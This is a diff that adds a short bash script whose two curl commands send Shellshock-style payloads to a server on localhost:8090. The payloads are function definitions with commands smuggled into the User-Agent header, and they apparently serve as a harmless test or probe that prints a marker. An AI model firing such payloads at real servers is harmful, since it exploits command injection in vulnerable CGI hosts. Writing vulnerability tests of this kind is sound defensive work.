@@ -1,0 +1,4 @@
+#!/bin/bash
+
+curl  -A '() { ignored; }; echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014 output : $((1+2))\x22' localhost:8090
+curl  -A '() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014 output : $((1+2))\x22; }' localhost:8090
